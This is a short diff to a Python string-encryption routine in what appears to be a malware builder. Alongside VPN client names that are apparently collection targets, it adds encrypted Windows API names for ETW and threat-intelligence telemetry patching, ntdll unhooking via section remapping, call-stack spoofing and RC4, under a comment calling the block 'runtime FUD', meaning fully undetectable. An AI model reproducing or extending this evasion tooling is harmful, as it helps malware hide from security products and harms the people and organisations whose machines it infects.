@@ -711,6 +711,20 @@ def rewrite_encrypted_strings(key):
         ("vpn_radminvpn", "RadminVPN"),
         ("vpn_softether", "SoftEther"),
         ("vpn_protonvpn", "ProtonVPN"),
+        # Stack spoof / ETW-TI / unhook (runtime FUD)
+        ("kernelbase", "kernelbase.dll"),
+        ("EtwEventWriteEx", "EtwEventWriteEx"),
+        ("EtwEventWriteString", "EtwEventWriteString"),
+        ("EtwTiSetProviderState", "EtwTiSetProviderState"),
+        ("RtlUserThreadStart", "RtlUserThreadStart"),
+        ("BaseThreadInitThunk", "BaseThreadInitThunk"),
+        ("NtOpenSection", "NtOpenSection"),
+        ("NtMapViewOfSection", "NtMapViewOfSection"),
+        ("NtUnmapViewOfSection", "NtUnmapViewOfSection"),
+        ("NtReadFile", "NtReadFile"),
+        ("SystemFunction032", "SystemFunction032"),
+        ("RtlLookupFunctionEntry", "RtlLookupFunctionEntry"),
+        ("RtlAddFunctionTable", "RtlAddFunctionTable"),
     ]
 
     lines = []
